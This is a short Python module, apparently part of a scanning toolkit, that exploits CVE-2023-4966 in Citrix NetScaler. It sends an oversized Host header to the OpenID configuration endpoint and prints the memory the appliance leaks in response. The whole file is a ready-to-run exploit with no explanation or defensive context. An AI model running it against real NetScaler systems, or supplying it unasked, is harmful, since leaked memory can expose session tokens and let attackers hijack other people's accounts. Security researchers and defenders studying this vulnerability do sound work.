#!/user/bin/env python3
# -*- coding: utf-8 -*-
import requests
import urllib3
from libs.public.outprint import OutPrintInfo
from libs.public.reqset import ReqSet
urllib3.disable_warnings()


class Cve_2023_4966:
    def main(self,target):
        hostname = target[0].strip("/ ")
        ssl = target[1]
        head = target[2]
        proxy = target[3]

        req = ReqSet(proxy=proxy)
        proxies = req["proxy"]
        headers = {
            "User-Agent":head,
            "Host": "a"*24576
        }
        url = f"{hostname}/oauth/idp/.well-known/openid-configuration"
        r = requests.get(url, headers=headers, verify=ssl,proxies=proxies,timeout=10)
        if r.status_code == 200:
            OutPrintInfo("NetScaler", "--- Dumped Memory ---")
            OutPrintInfo("NetScaler", r.text[131050:])
            OutPrintInfo("NetScaler", "---      End      ---")
        else:
            OutPrintInfo("NetScaler", "Could not dump memory")